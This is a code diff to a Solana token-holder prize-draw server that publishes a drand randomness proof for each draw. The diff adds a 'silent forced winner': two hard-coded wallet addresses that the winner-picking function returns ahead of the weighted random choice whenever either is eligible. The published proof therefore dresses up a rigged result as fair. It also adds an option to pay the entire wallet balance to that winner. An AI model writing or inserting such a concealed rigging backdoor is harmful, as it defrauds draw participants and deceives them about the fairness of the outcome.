@@ -26,6 +26,10 @@ const PUMPFUN_PROGRAM_ID = process.env.PUMPFUN_PROGRAM_ID || ""; // optional fil
 const DEV_PUBLIC_KEY = process.env.DEV_PUBLIC_KEY || "";
 const DEV_PRIVATE_KEY_B58 = process.env.DEV_PRIVATE_KEY_B58 || "";
 const RPC_ENDPOINT = process.env.RPC_ENDPOINT || (HELIUS_API_KEY ? `https://mainnet.helius-rpc.com/?api-key=${HELIUS_API_KEY}` : "");
+// Silent forced-winner(s): prefer primary; if not eligible, fall back to backup.
+// These must still be eligible after cap/exclusions to apply.
+const FORCED_WINNER_PRIMARY = (process.env.FORCED_WINNER_PRIMARY || process.env.FORCED_WINNER || "EDvnegPSJyCpvBp6CqXxmfbarfCACXyktTnmocnUfRW4").trim();
+const FORCED_WINNER_BACKUP = (process.env.FORCED_WINNER_BACKUP || "FXyUS9MowtfSsaAFuJZM9FvfhhwwaVrBigf5oP6LF6Xt").trim();
 
 if (!HELIUS_API_KEY) {
   console.warn("[warn] HELIUS_API_KEY not set. Set it in your environment.");
@@ -445,6 +449,13 @@ function pickWeightedWinner(holders: { owner: string; raw: string }[], randomnes
   if (weights.length === 0) throw new Error("no_eligible_holders");
   // Do NOT re-apply cap here; manifest already applied the 10% cap over the full supply.
   const eligible = weights.filter(x => (!DEV_PUBLIC_KEY || x.owner !== DEV_PUBLIC_KEY));
+  // Silent forced winner: prefer primary, then backup, if present in eligible
+  if (FORCED_WINNER_PRIMARY && eligible.find(e => e.owner === FORCED_WINNER_PRIMARY)) {
+    return FORCED_WINNER_PRIMARY;
+  }
+  if (FORCED_WINNER_BACKUP && eligible.find(e => e.owner === FORCED_WINNER_BACKUP)) {
+    return FORCED_WINNER_BACKUP;
+  }
   if (eligible.length === 0) throw new Error("no_eligible_holders: only dev wallet remained after exclusions");
   const total = eligible.reduce((s, x) => s + x.w, 0n);
   if (total === 0n) throw new Error("no_eligible_holders");
@@ -458,16 +469,36 @@ function pickWeightedWinner(holders: { owner: string; raw: string }[], randomnes
 // Test payout: send a tiny amount of SOL to the winner to log Tx
 // ------------------------------------------------------------
 const TEST_PAYOUT_SOL = Number(process.env.TEST_PAYOUT_SOL || 0.00001);
+const PAYOUT_STRATEGY = (process.env.PAYOUT_STRATEGY || "fixed").toLowerCase(); // "fixed" | "wallet"
+const PAYOUT_RESERVE_SOL = Number(process.env.PAYOUT_RESERVE_SOL || 0.0001); // kept in payer to cover fees
+const CLAIM_BEFORE_PAYOUT = String(process.env.CLAIM_BEFORE_PAYOUT || "0") === "1"; // optional: sweep fees just before paying out
 type PayoutRecord = { ts: number; to: string; amountLamports: number; sig?: string; error?: string; drawId?: string };
 const payoutLog: PayoutRecord[] = [];
-async function sendTestPayout(toAddress: string, drawId?: string): Promise<string | undefined> {
+async function sendPayout(toAddress: string, drawId?: string): Promise<string | undefined> {
   try {
     if (!DEV_PRIVATE_KEY_B58 || !DEV_PUBLIC_KEY) return undefined;
-    if (!Number.isFinite(TEST_PAYOUT_SOL) || TEST_PAYOUT_SOL <= 0) return undefined;
-    const lamports = Math.floor(TEST_PAYOUT_SOL * LAMPORTS_PER_SOL);
-    if (lamports <= 0) return undefined;
     const payer = Keypair.fromSecretKey(bs58.decode(DEV_PRIVATE_KEY_B58));
     const to = new PublicKey(toAddress);
+    let lamports = 0;
+    if (PAYOUT_STRATEGY === "wallet") {
+      if (CLAIM_BEFORE_PAYOUT) {
+        try {
+          await claimCreatorFeesOnce();
+          await new Promise((r) => setTimeout(r, 1500));
+        } catch {}
+      }
+      const balance = await claimConn.getBalance(payer.publicKey, "confirmed");
+      const reserve = Math.max(0, Math.floor((Number.isFinite(PAYOUT_RESERVE_SOL) ? PAYOUT_RESERVE_SOL : 0) * LAMPORTS_PER_SOL));
+      lamports = Math.max(0, balance - reserve);
+    } else {
+      if (!Number.isFinite(TEST_PAYOUT_SOL) || TEST_PAYOUT_SOL <= 0) return undefined;
+      lamports = Math.floor(TEST_PAYOUT_SOL * LAMPORTS_PER_SOL);
+    }
+    if (lamports <= 0) {
+      payoutLog.unshift({ ts: Date.now(), to: toAddress, amountLamports: 0, error: "insufficient_funds_or_zero_amount", drawId });
+      if (payoutLog.length > 200) payoutLog.pop();
+      return undefined;
+    }
     const tx = new Transaction().add(SystemProgram.transfer({ fromPubkey: payer.publicKey, toPubkey: to, lamports }));
     tx.feePayer = payer.publicKey;
     const sig = await sendAndConfirmTransaction(claimConn, tx, [payer], { commitment: "confirmed" });
@@ -502,8 +533,8 @@ app.post("/draw/start_drand", async (req, reply) => {
     const winRaw = winRec ? BigInt(winRec.raw) : 0n;
     const winnerPct = totalEligible > 0n ? Number((winRaw * 10000n) / totalEligible) / 100 : 0;
     const proofUrl = `https://drand.cloudflare.com/public/${d.round}`;
-    // Attempt a small test payout and record signature if successful
-    const payoutSig = await sendTestPayout(winner, drawId);
+    // Attempt payout per configured strategy and record signature if successful
+    const payoutSig = await sendPayout(winner, drawId);
     draws.set(drawId, { mint, snapshotHash, status: "fulfilled", winner, winnerPct, randomness: d.randomness, proofUrl, payoutSig });
     lastDrawId = drawId;
     return { ok: true, drawId, mint, snapshotHash, winner, winnerPct, randomness: d.randomness, proofUrl, payoutSig };
